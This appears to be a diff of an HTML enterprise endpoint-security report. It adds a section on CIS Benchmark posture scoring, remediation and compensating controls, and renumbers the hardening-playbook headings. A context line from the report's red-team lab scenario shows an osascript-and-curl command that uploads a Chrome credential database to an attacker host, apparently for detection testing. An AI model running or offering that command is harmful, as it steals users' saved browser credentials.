@@ -1353,7 +1353,22 @@
         <!-- ===== SECTION 6: HARDENING PLAYBOOKS ===== -->
         <h2 id="hardening">6. Practical Recommendations &amp; Hardening Playbooks</h2>
 
-        <h3>6.1 Windows 11 Enterprise Hardening Playbook (2026)</h3>
+
+        <h3>6.1 Posture Over Platform: The Role of CIS Benchmarks</h3>
+        
+        <p>Before diving into OS-specific configurations, we must address a critical reality: <strong>endpoint OS security alone makes no sense at the enterprise level if configuration posture is ignored.</strong> Debating Windows vs. macOS is academic if both are deployed with default, unhardened configurations. Finding what is wrong and fixing it makes infinitely more sense irrespective of the operating system.</p>
+        
+        <div class="technical-box" style="margin-bottom: 2.5rem;">
+            <h4><i class="fas fa-clipboard-check" style="color: var(--accent-cyan);"></i> Driving Maturity with CIS Benchmarking</h4>
+            <p>Organizations must adopt quantitative maturity scoring using frameworks like the <strong>Center for Internet Security (CIS) Benchmarks</strong>. These benchmarks provide specific, measurable configuration states (Level 1 for basic hygiene, Level 2 for defense-in-depth) that replace gut feelings with empirical data.</p>
+            <ul>
+                <li><strong>Measuring Posture:</strong> By continuously scanning fleets against CIS Benchmarks using MDM compliance policies or posture management tools, organizations can generate a numeric maturity score (e.g., 85% CIS Level 1 compliance) to track drift.</li>
+                <li><strong>Fixing Open Issues:</strong> The primary goal is aggressive, automated remediation. When a gap is found (e.g., FileVault is disabled on 5% of Macs, or NTLMv1 is allowed on 10% of Windows machines), it must be enforced via MDM configuration profiles, preventing user override.</li>
+                <li><strong>Compensating Controls for Accepted Risk:</strong> 100% compliance is rarely feasible in a complex enterprise. If applying a CIS control (like disabling legacy Office macros or enforcing strict PPPC rules) breaks a critical legacy business application, that risk must be formally accepted. Crucially, <em>accepted risk requires compensating controls</em>. If you cannot disable macros, you must deploy strict EDR behavioral rules, network segmentation, or tighter Conditional Access policies to isolate that specific endpoint's risk.</li>
+            </ul>
+        </div>
+
+        <h3>6.2 Windows 11 Enterprise Hardening Playbook (2026)</h3>
 
         <div class="success-box">
             <p><strong><i class="fas fa-shield-alt"></i> Windows Hardening — Priority Order:</strong></p>
@@ -1407,7 +1422,7 @@ $report['ASR Rules Configured'] = "$asrEnabled rules active"
 $report.GetEnumerator() | ForEach-Object { Write-Host "$($_.Key): $($_.Value)" }</code></pre>
         </div>
 
-        <h3>6.2 macOS Sequoia 26.5 Enterprise Hardening Playbook</h3>
+        <h3>6.3 macOS Sequoia 26.5 Enterprise Hardening Playbook</h3>
 
         <div class="success-box">
             <p><strong><i class="fas fa-apple-alt"></i> macOS Hardening — Priority Order:</strong></p>
@@ -1470,7 +1485,7 @@ echo "=== Check Complete ==="</code></pre>
         </div>
 
         <!-- Red Team Lab Scenario -->
-        <h3>6.3 Red Team Lab Scenario: macOS Stealer Detection Gap</h3>
+        <h3>6.4 Red Team Lab Scenario: macOS Stealer Detection Gap</h3>
 
         <div class="exploit-box">
             <span class="exploit-label"><i class="fas fa-skull-crossbones"></i> Offensive: macOS Infostealer Technique (For Detection Testing)</span>
@@ -1494,7 +1509,7 @@ osascript -e 'do shell script "curl -s -F file=@\"'$CHROME_DB'\" https://[ATTACK
         </div>
 
         <!-- YARA / Sigma Rules -->
-        <h3>6.4 Detection Engineering: Sigma Rule for macOS LOLBin Abuse</h3>
+        <h3>6.5 Detection Engineering: Sigma Rule for macOS LOLBin Abuse</h3>
 
         <div class="technical-box">
             <h4><i class="fas fa-search"></i> Sigma Rule: macOS osascript + Curl Credential Theft Chain</h4>
